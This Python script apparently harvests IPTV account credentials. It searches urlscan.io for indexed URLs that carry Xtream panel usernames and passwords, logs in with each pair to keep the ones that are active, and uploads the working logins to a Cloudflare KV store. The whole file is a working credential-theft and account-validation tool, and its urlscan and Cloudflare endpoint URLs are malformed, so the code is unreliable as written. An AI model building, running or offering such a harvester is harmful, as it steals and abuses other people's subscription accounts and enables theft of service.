import os
import sys
import asyncio
import aiohttp
import json
import re

# --- PIPELINE INITIALIZATION CONFIGURATIONS ---
URLSCAN_API_KEY = os.environ.get("URLSCAN_API_KEY")
CF_ACCOUNT_ID = os.environ.get("CLOUDFLARE_ACCOUNT_ID") or os.environ.get("CF_ACCOUNT_ID")
CF_NAMESPACE_ID = os.environ.get("CLOUDFLARE_NAMESPACE_ID") or os.environ.get("CF_NAMESPACE_ID")
CF_API_TOKEN = os.environ.get("CLOUDFLARE_API_TOKEN") or os.environ.get("CF_API_TOKEN")

# Force-verify essential cloud infrastructure variables are mapped into the execution workspace
if not all([CF_ACCOUNT_ID, CF_NAMESPACE_ID, CF_API_TOKEN]):
    print("❌ ERROR: Missing required Cloudflare deployment authentication keys inside environment secrets.")
    sys.exit(1)

TARGET_SEARCH_QUERIES = [
    'page.url:"/get.php?username="',
    'page.url:"/player_api.php?username="'
]


async def query_urlscan_registry(session, search_query):
    """
    Queries urlscan.io public tracking maps to pull down recently indexed site headers.
    """
    print(f"🔍 Searching index logs for query expression: {search_query}")
    endpoint = f"https://urlscan.io{urllib.parse.quote_plus(search_query)}&size=100"
    
    headers = {}
    if URLSCAN_API_KEY:
        headers["API-Key"] = URLSCAN_API_KEY

    try:
        async with session.get(endpoint, headers=headers, timeout=15) as res:
            if res.status == 200:
                data = await res.json()
                return data.get("results", [])
            else:
                print(f"    ⚠️ Urlscan tracker returned non-OK response code: {res.status}")
    except Exception as e:
        print(f"    ❌ Network connection dropped on tracker lookup: {e}")
    return []


async def verify_panel_credentials(session, raw_url):
    """
    Pings the discovered panel using standard Xtream API login models to check if it's active.
    """
    try:
        # Match explicit username/password parameters safely
        user_match = re.search(r'[?&](?:username|user)=([^&#\s]+)', raw_url, re.I)
        pass_match = re.search(r'[?&](?:password|pass)=([^&#\s]+)', raw_url, re.I)
        
        if not (user_match and pass_match):
            return None
            
        username = user_match.group(1)
        password = pass_match.group(1)
        
        parsed_url = urllib.parse.urlparse(raw_url)
        base_panel_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        
        # Build authentication verification request link
        test_endpoint = f"{base_panel_url}/player_api.php?username={username}&password={password}"
        
        async with session.get(test_endpoint, headers={"User-Agent": "IPTVSmartersPro"}, timeout=6) as response:
            if response.status == 200:
                payload = await response.json()
                
                # Check standard server authorization markers to protect against expired logs
                user_info = payload.get("user_info", {})
                if user_info.get("auth") == 1 and user_info.get("status") == "Active":
                    clean_line = f"{base_panel_url}/get.php?username={username}&password={password}"
                    print(f"    🎉 LIVE CREDENTIAL INDEX LOCATED -> {base_panel_url}")
                    return clean_line
    except Exception:
        pass
    return None


async def sync_to_cloudflare_kv(verified_links_list):
    """
    Pushes our clean, verified credentials array straight back into your IPTV_STORE namespace.
    """
    if not verified_links_list:
        print("ℹ️ Sync step bypassed: No newly identified working credentials found during this pass.")
        return False
        
    print(f"🔄 Preparing database sync update for {len(verified_links_list)} verified records...")
    url = f"https://cloudflare.com{CF_ACCOUNT_ID}/kv/namespaces/{CF_NAMESPACE_ID}/values/raw_credentials"
    
    headers = {
        "Authorization": f"Bearer {CF_API_TOKEN}",
        "Content-Type": "text/plain"
    }
    
    payload_data = "\n".join(verified_links_list)
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.put(url, headers=headers, data=payload_data.encode('utf-8'), timeout=15) as res:
                if res.status in (200, 201):
                    print("✅ DATABASE SYNC COMPLETE: Cloudflare namespace index updated successfully!")
                    return True
                else:
                    print(f"    ❌ Sync operation rejected by Cloudflare API gateway. Status: {res.status}")
    except Exception as e:
        print(f"    ⚠️ Fatal exception occurred on database write sequence: {e}")
    return False


async def main_pipeline():
    print("===============================================")
    print("🚀 INITIALIZING URLSCAN XTREAM HARVESTER AGENT")
    print("===============================================")
    
    async with aiohttp.ClientSession() as session:
        discovered_targets = []
        for query in TARGET_SEARCH_QUERIES:
            results = await query_urlscan_registry(session, query)
            for item in results:
                page_url = item.get("page", {}).get("url")
                if page_url and page_url not in discovered_targets:
                    discovered_targets.append(page_url)
                    
        print(f"Discovered {len(discovered_targets)} potential targets. Starting validation loop...")
        print("===============================================")
        
        # Run credential check requests concurrently across all discovered links
        validation_tasks = [verify_panel_credentials(session, url) for url in discovered_targets]
        results = await asyncio.gather(*validation_tasks)
        
        verified_live_links = [link for link in results if link is not None]
        verified_live_links = list(set(verified_live_links))
        
        print("===============================================")
        print(f"Validation phase finished. Found {len(verified_live_links)} live authorized server nodes.")
        
        # Commit the live records straight into Cloudflare storage
        await sync_to_cloudflare_kv(verified_live_links)
        print("===============================================")


if __name__ == "__main__":
    import urllib.parse
    asyncio.run(main_pipeline())
